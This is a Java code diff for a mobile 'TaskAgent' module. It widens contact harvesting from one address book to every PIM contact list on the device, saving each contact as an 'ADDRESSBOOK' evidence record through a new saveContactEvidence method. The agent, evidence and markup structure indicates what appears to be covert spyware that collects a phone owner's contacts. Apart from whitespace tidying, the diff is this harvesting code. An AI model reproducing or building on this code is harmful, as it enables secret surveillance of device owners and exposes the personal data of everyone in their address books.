@@ -133,42 +133,87 @@ public final class TaskAgent extends Agent implements PIMListListener {
         }
 
         ContactList contactList;
-        try {
+        int number = 0;
+
+      /*  try {
             contactList = (ContactList) PIM.getInstance().openPIMList(
                     PIM.CONTACT_LIST, PIM.READ_ONLY);
 
-            final Enumeration eContacts = contactList.items();
-
+            number = saveContactEvidence(contactList);
             //#ifdef DEBUG
-            debug.trace("actualRun: got contacts");
+            debug.trace("actualRun: saved " + number);
             //#endif
-
-            evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
-
-            Contact contact;
-            while (eContacts.hasMoreElements()) {
-
-                try {
-                    contact = (Contact) eContacts.nextElement();
-                    final byte[] packet = getContactPacket(contactList, contact);
-                    evidence.writeEvidence(packet);
-                } catch (final Exception ex) {
-                    //#ifdef DEBUG
-                    debug.error(ex);
-                    //#endif
-                }
-            }
-
-            evidence.close();
-
             markup.createEmptyMarkup();
 
         } catch (final PIMException e) {
             //#ifdef DEBUG
             debug.error(e);
             //#endif
+        }*/
+
+        String[] lists = PIM.getInstance().listPIMLists(PIM.CONTACT_LIST);
+        //#ifdef DEBUG
+        debug.trace("actualRun lists: " + lists.length);
+        //#endif
+
+        for (int i = 0; i < lists.length; i++) {
+            try {
+                String name = lists[i];
+                //#ifdef DEBUG
+                debug.trace("actualRun: opening " + name);
+                //#endif
+                contactList = (ContactList) PIM.getInstance().openPIMList(
+                        PIM.CONTACT_LIST, PIM.READ_ONLY, name);
+
+                number = saveContactEvidence(contactList);
+                //#ifdef DEBUG
+                debug.trace("actualRun: saved " + number);
+                //#endif
+
+                markup.createEmptyMarkup();
+
+            } catch (final PIMException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+            }
         }
 
+    }
+
+    private int saveContactEvidence(ContactList contactList)
+            throws PIMException {
+        final Enumeration eContacts = contactList.items();
+
+        //#ifdef DEBUG
+        debug.trace("saveContactEvidence: got contacts");
+        //#endif
+
+        evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
+
+        Contact contact;
+        int number = 0;
+        while (eContacts.hasMoreElements()) {
+            //#ifdef DEBUG
+            debug.trace("saveContactEvidence: contact #" + ++number);
+            //#endif
+            try {
+                contact = (Contact) eContacts.nextElement();
+                final byte[] packet = getContactPacket(contactList, contact);
+                evidence.writeEvidence(packet);
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
+                debug.error(ex);
+                //#endif
+            }
+        }
+
+        //#ifdef DEBUG
+        debug.trace("saveContactEvidence: finished contacts. Total: " + number);
+        //#endif
+        evidence.close();
+
+        return number;
     }
 
     /**
@@ -192,7 +237,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
         final byte[] payload = new byte[0];
 
         final DataBuffer dbPayload = new DataBuffer(payload, 0, 2048, false);
-        
+
         initCustomFields();
 
         final String[] categories = contact.getCategories();
@@ -203,7 +248,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
         }
 
         int uid = 0;
-        
+
         if (contactList.isSupportedField(Contact.UID)) {
             if (contact.countValues(Contact.UID) > 0) {
                 final String suid = contact.getString(Contact.UID, 0);
@@ -460,13 +505,13 @@ public final class TaskAgent extends Agent implements PIMListListener {
             debug.error("finishCustomFields");
             //#endif
         } else {
-            try{
-            //#ifdef DEBUG
-            debug.trace("finishCustomFields: " + customBuffer.toString());
-            //#endif
-            Utils.addTypedString(dbPayload, (byte) 0x37,
-                    customBuffer.toString());
-            }catch(Exception ex){
+            try {
+                //#ifdef DEBUG
+                debug.trace("finishCustomFields: " + customBuffer.toString());
+                //#endif
+                Utils.addTypedString(dbPayload, (byte) 0x37,
+                        customBuffer.toString());
+            } catch (Exception ex) {
                 //#ifdef DEBUG
                 debug.error("finalizeCustomFields: " + ex);
                 //#endif
